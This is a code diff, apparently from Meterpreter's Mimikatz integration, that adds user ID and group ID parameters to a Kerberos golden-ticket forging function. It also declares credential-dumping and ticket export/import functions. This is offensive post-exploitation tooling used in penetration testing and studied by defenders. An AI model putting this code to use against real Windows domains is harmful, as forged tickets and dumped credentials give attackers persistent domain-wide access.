@@ -42,7 +42,8 @@ extern LONG kuhl_m_sekurlsa_ssp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID 
 extern LONG kuhl_m_lsadump_full(PLSA_CALLBACK_CTX callbackCtx);
 extern LONG kuhl_m_kerberos_list_tickets(PKERB_CALLBACK_CTX callbackCtx, BOOL bExport);
 extern LONG kuhl_m_kerberos_use_ticket(PBYTE fileData, DWORD fileSize);
-extern LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWCHAR szSid, PCWCHAR szNtlm, PBYTE* ticketBuffer, DWORD* ticketBufferSize);
+extern LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWCHAR szSid, PCWCHAR szNtlm,
+	DWORD dwId, DWORD* pdwGroups, DWORD dwGroupCount, PBYTE* ticketBuffer, DWORD* ticketBufferSize);
 extern LONG kuhl_m_kerberos_purge_ticket();
 
 /*!
@@ -302,10 +303,13 @@ DWORD mimikatz_kerberos_ticket_purge()
  * @param lpDomain Name of the domain the ticket should apply to.
  * @param lpSid The Domain SID.
  * @param lpTgt The ticket granting token.
+ * @param dwId Id of the user to create the ticket for (defaults to 500 is 0 is passed).
+ * @param pdwGroupIds Array of group ids to apply to the ticket.
+ * @param dwGroupCount Number of ids in the group id array.
  * @param pResponse Pointer to the packet which the results should be added to.
  * @returns Indication of success or failure.
  */
-DWORD mimikatz_kerberos_golden_ticket_create(char* lpUser, char* lpDomain, char* lpSid, char* lpTgt, Packet* pResponse)
+DWORD mimikatz_kerberos_golden_ticket_create(char* lpUser, char* lpDomain, char* lpSid, char* lpTgt, DWORD dwId, DWORD* pdwGroupIds, DWORD dwGroupCount, Packet* pResponse)
 {
 	DWORD result = 0;
 	BYTE* ticketBuffer;
@@ -323,7 +327,7 @@ DWORD mimikatz_kerberos_golden_ticket_create(char* lpUser, char* lpDomain, char*
 			result = ERROR_NOT_ENOUGH_MEMORY;
 		}
 
-		result = kuhl_m_kerberos_create_golden_ticket(lpwUser, lpwDomain, lpwSid, lpwTgt, &ticketBuffer, &ticketBufferSize);
+		result = kuhl_m_kerberos_create_golden_ticket(lpwUser, lpwDomain, lpwSid, lpwTgt, dwId, pdwGroupIds, dwGroupCount, &ticketBuffer, &ticketBufferSize);
 		if (result != ERROR_SUCCESS)
 		{
 			break;
